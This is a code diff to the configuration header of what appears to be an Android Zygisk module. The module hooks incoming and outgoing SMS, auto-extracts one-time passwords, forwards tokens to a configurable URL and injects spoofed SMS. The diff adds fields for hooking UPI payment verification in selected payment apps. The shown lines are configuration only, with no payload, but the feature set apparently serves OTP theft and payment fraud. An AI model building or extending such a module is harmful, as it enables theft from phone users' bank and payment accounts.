@@ -22,6 +22,7 @@ struct ModuleConfig {
 
     bool hook_incoming_sms = true;
     bool hook_outgoing_sms = true;
+    bool hook_upi_verification = true;
     bool auto_extract_otp = true;
     bool auto_forward_token = true;
     std::string forward_url;
@@ -33,6 +34,9 @@ struct ModuleConfig {
     std::string inject_sender_id = "AD-TEST-S";
     std::string inject_message_body;
     std::string log_file = "/data/local/tmp/hivirtus_zygisk_mode.log";
+    std::map<std::string, bool> hooked_upi_apps;
+
+    bool is_upi_app_hooked(const std::string& package) const;
 };
 
 class ConfigManager {
